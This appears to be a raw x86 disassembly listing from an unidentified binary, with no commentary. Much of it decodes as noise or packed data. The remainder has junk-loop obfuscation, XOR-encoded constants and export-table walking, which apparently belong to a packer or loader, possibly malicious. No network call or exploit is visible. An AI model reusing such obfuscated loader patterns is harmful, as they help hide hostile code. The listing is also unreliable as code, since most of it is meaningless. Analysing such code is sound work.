  410875:	pop    esp
  410876:	inc    eax
  410877:	adc    ax,WORD PTR [edi-0x71e441f6]
  41087e:	mov    ch,0x90
  410880:	retf   0xac98
  410883:	cmp    al,0x1c
  410885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410886:	call   DWORD PTR [ebx+0x1d]
  410889:	arpl   cx,bx
  41088b:	xchg   DWORD PTR [eax],eax
  41088d:	xor    al,0xf3
  41088f:	mov    eax,0x633ccee5
  410894:	sti    
  410895:	cmp    BYTE PTR [edx],ch
  410897:	imul   esi,DWORD PTR [ecx],0xffffffff
  41089a:	sti    
  41089b:	push   edx
  41089c:	imul   eax,ebx,0xffffffde
  41089f:	jae    0x4108d3
  4108a1:	lods   eax,DWORD PTR ds:[esi]
  4108a2:	xchg   ecx,eax
  4108a3:	xor    DWORD PTR [esi],ecx
  4108a5:	lock or BYTE PTR [ebp+0x33],al
  4108a9:	ins    BYTE PTR es:[edi],dx
  4108aa:	fucomip st,st(7)
  4108ac:	imul   ecx,DWORD PTR [ebx],0x183f03d1
  4108b2:	adc    BYTE PTR [ebx+0x6923440b],ch
  4108b8:	adc    DWORD PTR [esi-0x7a],ebp
  4108bb:	mov    WORD PTR [eax],es
  4108bd:	xchg   esp,eax
  4108be:	pusha  
  4108bf:	adc    eax,0x1009970d
  4108c4:	dec    eax
  4108c5:	inc    esi
  4108c6:	xchg   edi,eax
  4108c7:	das    
  4108c8:	and    al,cl
  4108ca:	sbb    eax,DWORD PTR [eax]
  4108cc:	sar    DWORD PTR [ebx],cl
  4108ce:	std    
  4108cf:	fwait
  4108d0:	add    BYTE PTR [edi+0x10],ah
  4108d3:	js     0x410940
  4108d5:	add    ch,al
  4108d7:	and    DWORD PTR [esi+0x31d63ec1],ebx
  4108dd:	mov    ah,BYTE PTR [esi]
  4108df:	pushf  
  4108e0:	pushf  
  4108e1:	dec    ebx
  4108e2:	pop    ebx
  4108e3:	xor    al,0x27
  4108e5:	push   eax
  4108e6:	retf   0xd347
  4108e9:	add    DWORD PTR [eax],edx
  4108eb:	repnz popf 
  4108ed:	sbb    ah,ch
  4108ef:	mov    ebp,0x741601be
  4108f4:	aas    
  4108f5:	mov    ecx,DWORD PTR [ebp-0xcee33a7]
  4108fb:	jmp    0x3010:0xd34f7c28
  410902:	sahf   
  410903:	stc    
  410904:	push   edi
  410905:	and    dh,BYTE PTR [eax]
  410907:	sbb    al,0x2e
  410909:	xor    bh,BYTE PTR [eax+0x55299080]
  41090f:	test   DWORD PTR [ebx-0x17],0xe2269c28
  410916:	fisub  DWORD PTR [edi]
  410918:	sahf   
  410919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41091a:	sbb    al,0xd2
  41091c:	adc    eax,0x6d3f62d
  410921:	inc    ecx
  410922:	dec    esp
  410923:	pop    edi
  410924:	cs jno 0x4108cf
  410927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410928:	stc    
  410929:	sbb    al,0x45
  41092b:	mov    bl,0x48
  41092d:	call   0x3cffe493
  410932:	shl    BYTE PTR [edx],1
  410934:	and    eax,0xfe2d1839
  410939:	adc    eax,0x9a63b074
  41093e:	cdq    
  41093f:	push   ds
  410940:	mov    ebp,0x22d393c
  410945:	pop    ecx
  410946:	inc    esp
  410947:	lea    eax,[ebp-0x5e30e286]
  41094d:	mov    dh,0x3f
  41094f:	sub    al,0x30
  410951:	push   ss
  410952:	mov    dh,0x99
  410954:	je     0x4109b8
  410956:	xchg   esi,eax
  410957:	xor    al,0xfa
  410959:	icebp  
  41095a:	xor    BYTE PTR [edx-0x1cb42d24],dh
  410960:	pop    esp
  410961:	fldl2t 
  410963:	pop    edx
  410964:	xchg   edx,eax
  410965:	jae    0x41095f
  410967:	adc    edx,edx
  410969:	or     al,BYTE PTR [ebx+0x7]
  41096c:	fwait
  41096d:	ret    0x15f
  410970:	loop   0x4109eb
  410972:	arpl   ax,si
  410974:	fcom   DWORD PTR [esi]
  410976:	adc    al,BYTE PTR [ebp+0x133d599a]
  41097c:	fistp  QWORD PTR [ebx+0x13]
  41097f:	dec    esi
  410980:	and    dh,BYTE PTR [ecx]
  410982:	or     eax,DWORD PTR [ecx]
  410984:	cs mov dh,al
  410987:	dec    edx
  410988:	jecxz  0x4109aa
  41098a:	jg     0x4109ad
  41098c:	mov    ecx,0x1bf1ed45
  410991:	pop    esi
  410992:	loop   0x4109e4
  410994:	pop    ss
  410995:	std    
  410996:	imul   eax,DWORD PTR [ebp-0x6f],0x11
  41099a:	(bad)  
  41099b:	cmp    esi,DWORD PTR [ecx]
  41099d:	push   0x62
  41099f:	push   ss
  4109a0:	imul   esp,DWORD PTR [edi-0x56],0x8
  4109a4:	jl     0x4109c6
  4109a6:	popf   
  4109a7:	stos   DWORD PTR es:[edi],eax
  4109a8:	pushf  
  4109a9:	xchg   ecx,eax
  4109aa:	inc    esi
  4109ab:	mov    ds:0x17cbb4dd,al
  4109b0:	xchg   ebp,eax
  4109b1:	push   ebp
  4109b2:	loope  0x41094e
  4109b4:	jns    0x4109f7
  4109b6:	add    eax,0x13da7d70
  4109bb:	pop    esi
  4109bc:	rol    DWORD PTR [ecx+0x178bf33],0x66
  4109c3:	and    BYTE PTR [edx-0x775ae0d0],0xbb
  4109ca:	sub    BYTE PTR [ecx],cl
  4109cc:	dec    edi
  4109cd:	dec    eax
  4109ce:	mov    ecx,DWORD PTR [eax+0x2ad8020c]
  4109d4:	mov    bl,0x1a
  4109d6:	sbb    al,0x26
  4109d8:	cmp    cx,dx
  4109db:	jne    0x40e62e
  4109e1:	mov    ecx,DWORD PTR ds:0x424435
  4109e7:	mov    ecx,DWORD PTR [ecx+0x198]
  4109ed:	mov    DWORD PTR [ecx],eax
  4109ef:	jmp    0x410a15
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx-0x6d8b9d61],0x64
  410fc4:	inc    ebx
  410fc5:	cs scas al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x41100f
  410fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fcf:	aad    0xef
  410fd1:	cmp    eax,0xcf06ab96
  410fd6:	mov    dl,BYTE PTR ds:0x5459f66a
  410fdc:	in     al,dx
  410fdd:	into   
  410fde:	out    dx,eax
  410fdf:	dec    ebx
  410fe0:	inc    edx
  410fe1:	dec    ebx
  410fe2:	sbb    al,dl
  410fe4:	xchg   ecx,eax
  410fe5:	inc    ebx
  410fe6:	out    dx,eax
  410fe7:	mov    BYTE PTR [edx+esi*4+0x47d38879],dh
  410fee:	push   cs
  410fef:	cmp    BYTE PTR ds:0x61e35a05,0x16
  410ff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ff7:	mov    DWORD PTR [esp+eiz*4+0x3],ebx
  410ffb:	lods   al,BYTE PTR ds:[esi]
  410ffc:	jl     0x411019
  410ffe:	xor    al,0xf3
  411000:	in     al,0xf4
  411002:	fwait
  411003:	jae    0x411025
  411005:	sub    al,0x7b
  411007:	jmp    0x410ffe
  411009:	ret    
  41100a:	pop    ss
  41100b:	test   DWORD PTR ds:0x475854fe,ecx
  411011:	into   
  411012:	cmp    ebp,edx
  411014:	and    al,0xf4
  411016:	retf   
  411017:	imul   ebx,DWORD PTR [esi+0x9cce410],0xc767310a
  411021:	(bad)  
  411022:	push   esp
  411023:	bound  eax,QWORD PTR [ebp-0xa]
  411026:	lock jp 0x411025
  411029:	jg     0x41107e
  41102b:	mov    ah,0x5d
  41102d:	add    al,0x23
  41102f:	sub    bh,BYTE PTR [eax-0xc694f56]
  411035:	icebp  
  411036:	mov    ecx,0xfcfdbb0f
  41103b:	adc    DWORD PTR [ebx],esp
  41103d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41103e:	xchg   DWORD PTR [edi],edx
  411040:	sub    BYTE PTR [edi],bl
  411042:	xchg   BYTE PTR [edi+0x608cdbcb],dh
  411048:	(bad)  
  411049:	es fmul QWORD PTR ds:[ebp+0x502f7cd7]
  411051:	pop    es
  411052:	ss icebp 
  411054:	mov    ecx,0x85afec9c
  411059:	(bad)  
  41105a:	sub    BYTE PTR [edx],ch
  41105c:	pop    bx
  41105e:	push   edx
  41105f:	and    ebx,DWORD PTR [edx]
  411061:	jle    0x4110ba
  411063:	popa   
  411064:	mov    bh,0x8
  411066:	dec    edx
  411067:	daa    
  411068:	cwde   
  411069:	dec    ebp
  41106a:	das    
  41106b:	jg     0x4110d0
  41106d:	fidivr WORD PTR [ecx-0x432748ec]
  411073:	iret   
  411074:	sysenter 
  411076:	sbb    dh,0xdd
  411079:	stc    
  41107a:	loope  0x4110da
  41107c:	jmp    0x6dda:0xe648c96a
  411083:	ins    BYTE PTR es:[edi],dx
  411084:	iret   
  411085:	aad    0x84
  411087:	mov    dl,0xf9
  411089:	out    0xc8,al
  41108b:	aaa    
  41108c:	loope  0x41108d
  41108e:	retf   0x4fb7
  411091:	mov    WORD PTR [ecx-0x15],cs
  411094:	inc    ecx
  411095:	or     BYTE PTR [ebp+0x753f14c0],ah
  41109b:	mov    ds:0xbcadf3c7,al
  4110a0:	sub    BYTE PTR [eax],0x77
  4110a3:	jmp    0x411033
  4110a5:	rol    DWORD PTR [ecx],1
  4110a7:	or     bl,ch
  4110a9:	sbb    al,0x59
  4110ab:	lock mov WORD PTR [ecx],fs
  4110ae:	mov    dl,0x62
  4110b0:	pop    ds
  4110b1:	call   0x7e3e4ce8
  4110b6:	mov    ebp,0xe94b5a1d
  4110bb:	adc    BYTE PTR [ecx+0x77],dl
  4110be:	xor    al,0xd0
  4110c0:	test   eax,0x86fb0fff
  4110c5:	inc    edi
  4110c6:	retf   0x2fc
  4110c9:	call   0xe5629fb1
  4110ce:	sbb    esi,esp
  4110d0:	fwait
  4110d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110d2:	shl    DWORD PTR [edi+0x1b365286],1
  4110d8:	xchg   ecx,eax
  4110d9:	pop    edi
  4110da:	sub    cl,BYTE PTR [ecx-0x65373f6]
  4110e0:	jmp    0x289491e8
  4110e5:	cwde   
  4110e6:	call   0x36d6:0xca234671
  4110ed:	sub    dl,bl
  4110ef:	mov    esi,0xa5ec65f
  4110f4:	xor    eax,0xae07885d
  4110f9:	and    al,0xbc
  4110fb:	ds cdq 
  4110fd:	jnp    0x4110d8
  4110ff:	data16 or BYTE PTR [ebx],0x41
  411103:	rcr    edi,1
  411105:	jp     0x411174
  411107:	xchg   ebx,eax
  411108:	fcom   QWORD PTR ds:0x61e8b6ba
  41110e:	dec    edi
  41110f:	pop    ebp
  411110:	inc    edi
  411111:	or     esi,DWORD PTR [eax]
  411113:	xchg   esp,eax
  411114:	test   BYTE PTR [edi-0x5177b257],dl
  41111a:	clc    
  41111b:	add    al,0x2c
  41111d:	cwde   
  41111e:	adc    DWORD PTR [eax-0x12e441d7],esi
  411124:	or     esi,DWORD PTR ss:[edi-0x4f]
  411128:	mov    ebp,0x54e1cccf
  41112d:	jecxz  0x4110f2
  41112f:	and    ch,dl
  411131:	sub    eax,0xe627538c
  411136:	inc    edi
  411137:	in     eax,0x1a
  411139:	popf   
  41113a:	dec    esp
  41113b:	int    0xe0
  41113d:	lods   al,BYTE PTR ds:[esi]
  41113e:	sbb    al,0xed
  411140:	mov    ebp,0x7c2ef304
  411145:	ret    
  411146:	mov    ds:0xf335f89a,eax
  41114b:	in     al,dx
  41114c:	je     0x411165
  41114e:	mov    BYTE PTR ds:0x4601fde7,dh
  411154:	mov    dh,0xf
  411156:	in     eax,dx
  411157:	jmp    0x411106
  411159:	jecxz  0x411150
  41115b:	adc    dh,BYTE PTR [eax-0x36]
  41115e:	jecxz  0x4110f8
  411160:	xor    BYTE PTR [esi+0x2557c56],dh
  411166:	aam    0xf0
  411168:	jnp    0x411184
  41116a:	mov    eax,ds:0x1a03469e
  41116f:	mov    BYTE PTR [ecx+0x12],dl
  411172:	int3   
  411173:	and    ah,cl
  411175:	pop    ebx
  411176:	mov    bl,0x33
  411178:	ins    BYTE PTR es:[edi],dx
  411179:	push   esp
  41117a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41117b:	test   DWORD PTR [edi+ecx*8+0x69],esi
  41117f:	inc    ecx
  411180:	mov    eax,ds:0xa65962db
  411185:	push   ds
  411186:	test   eax,0xd5ea4b36
  41118b:	sbb    cl,BYTE PTR ds:0xf2b41042
  411191:	lds    ecx,FWORD PTR [ebx]
  411193:	in     eax,dx
  411194:	mov    al,0x3f
  411196:	enter  0xda0c,0x9e
  41119a:	rcr    BYTE PTR [eax],0x1
  41119d:	pop    bx
  41119f:	push   ecx
  4111a0:	out    dx,al
  4111a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111a3:	loopne 0x41114c
  4111a5:	jne    0x41112e
  4111a7:	push   ds
  4111a8:	sbb    al,0xb8
  4111aa:	mov    dh,0x90
  4111ac:	xor    dh,BYTE PTR [edx+ebx*1]
  4111af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111b0:	inc    esp
  4111b1:	rol    BYTE PTR [ebp-0x1ec008f4],0x2a
  4111b8:	repnz mov eax,ds:0x445718db
  4111be:	ss and eax,0x53271746
  4111c4:	daa    
  4111c5:	lahf   
  4111c6:	rol    BYTE PTR [eax+0x6b],1
  4111c9:	bnd jbe 0x4111e0
  4111cc:	ret    0x9401
  4111cf:	pop    esp
  4111d0:	jl     0x41117c
  4111d2:	loop   0x41118e
  4111d4:	jl     0x41121b
  4111d6:	mov    ds:0x9fd9de59,al
  4111db:	cmp    bl,BYTE PTR [edi]
  4111dd:	xchg   ecx,eax
  4111de:	outs   dx,BYTE PTR ds:[esi]
  4111df:	pop    edi
  4111e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111e1:	aam    0x16
  4111e3:	stos   DWORD PTR es:[edi],eax
  4111e4:	aaa    
  4111e5:	sub    eax,0xcd817215
  4111ea:	cmp    ah,bl
  4111ec:	sbb    eax,0xe3341d74
  4111f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111f2:	les    esp,FWORD PTR [edi+esi*2+0x2de49da3]
  4111f9:	and    dl,bh
  4111fb:	ret    0xba3
  4111fe:	outs   dx,DWORD PTR ds:[esi]
  4111ff:	fisttp QWORD PTR [ecx-0x7a]
  411202:	xor    BYTE PTR [edi+0x253e0197],dl
  411208:	mov    ebp,0x9f465808
  41120d:	cmp    DWORD PTR [eax+eiz*1+0x47436958],ebx
  411214:	call   0x9b3187bd
  411219:	fidivr DWORD PTR [edi]
  41121b:	inc    ebx
  41121c:	ds daa 
  41121e:	and    eax,0x4ec5a87c
  411223:	add    bl,BYTE PTR [edx]
  411225:	adc    bl,BYTE PTR [ebx+0x4]
  411228:	arpl   bp,si
  41122a:	mov    bh,0x81
